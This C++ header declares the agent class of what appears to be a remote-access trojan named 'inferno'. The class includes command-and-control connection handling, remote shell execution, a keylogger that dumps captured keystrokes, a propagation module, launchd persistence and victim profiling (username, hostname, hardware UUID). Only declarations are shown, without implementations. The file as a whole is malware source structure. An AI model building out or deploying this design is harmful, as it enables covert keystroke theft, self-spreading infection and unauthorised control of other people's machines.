#pragma once

#include "../../common/include/Socket.hpp"
#include "../../common/include/Packet.hpp"
#include "ProcessProfiler.hpp"
#include "ShellExecutor.hpp"
#include "KeyLogger.hpp"
#include "Propagator.hpp"
#include <string>
#include <vector>
#include <atomic>
#include <thread>
#include <mutex>
#include <condition_variable>

namespace inferno {

enum class AgentState {
    INIT,
    CONNECTING,
    CONNECTED,
    LISTENING,
    DISPATCHING,
    ERROR_STATE
};

class Agent {
public:
    // Coplien Canonical Form
    Agent();
    explicit Agent(const std::string& server_ip, uint16_t server_port);
    ~Agent();
    Agent(const Agent&) = delete;
    Agent& operator=(const Agent&) = delete;
    Agent(Agent&&)            = delete;
    Agent& operator=(Agent&&) = delete;

    // Core Loop
    void run();
    void stop();

    // Persistence (Phase 2.5) — also saves server IP/port for launchd auto-start
    static void installPersistence(const std::string& binary_path,
                                   const std::string& server_ip = "127.0.0.1",
                                   uint16_t server_port = 8080);

private:
    // FSM Handlers
    void handleInit();
    void handleConnecting();
    void handleConnected();
    void handleListening();
    void handleDispatching(Packet&& packet);
    void handleProcessDiscovery();
    void handleShellExecution(Packet&& packet);
    void handleKeylogStart();
    void handleKeylogStop();
    void handleKeylogDump();
    void handlePropagation(Packet&& packet);

    // System Profiler (Gourmandise Subsystem)
    std::string getHardwareUUID();
    std::string getSystemInfo();
    std::string getHostname();
    std::string getUsername();
    std::string getOSVersion();

    // Attributes
    std::string m_server_ip;
    uint16_t m_server_port;
    AgentState m_state;
    Socket m_socket;
    std::atomic<bool> m_running;
    std::vector<uint8_t> m_receive_buffer;
    ProcessProfiler m_profiler;
    ShellExecutor   m_shell;
    KeyLogger       m_keylogger;
    Propagator      m_propagator;

    // Keylogger jitter thread
    std::thread              m_keylog_jitter_thread;
    std::atomic<bool>        m_keylog_jitter_running;
    std::atomic<bool>        m_keylog_dump_requested;
    std::mutex               m_keylog_jitter_mutex;
    std::condition_variable  m_keylog_jitter_cv;

    // Shared buffer: jitter thread stores here, PONG handler picks up
    std::string              m_keylog_pending_data;
    std::mutex               m_keylog_pending_mutex;

    // Reconnect backoff (Phase 2.2)
    static constexpr unsigned MIN_BACKOFF  = 1;     // seconds
    static constexpr unsigned MAX_BACKOFF  = 300;   // 5 minutes
    unsigned                 m_reconnect_delay;
};

} // namespace inferno
